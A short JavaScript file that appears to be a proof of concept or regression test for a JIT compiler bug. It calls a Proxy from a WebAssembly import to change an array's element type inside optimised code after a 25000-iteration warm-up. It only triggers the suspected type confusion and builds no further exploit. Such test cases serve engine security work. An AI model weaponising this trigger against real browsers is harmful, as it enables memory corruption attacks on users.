const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,0,0,3,2,1,0,7,7,1,3,114,117,110,0,0,10,5,1,3,0,16,0,11]);
let arr = [1, 2, 3];
let do_side_effect = false;

const proxy = new Proxy(function(){}, {
    apply: function() {
        if (do_side_effect) {
            arr[0] = 1.1;
        }
    }
});

const module = new WebAssembly.Module(wasm_code);
const instance = new WebAssembly.Instance(module, {m: {f: proxy}});
const wasm_call = instance.exports.run;

function victim_func() {
    arr[0];
    wasm_call();
    return arr[0];
}

for (let i = 0; i < 25000; ++i) {
    victim_func();
}

do_side_effect = true;
victim_func();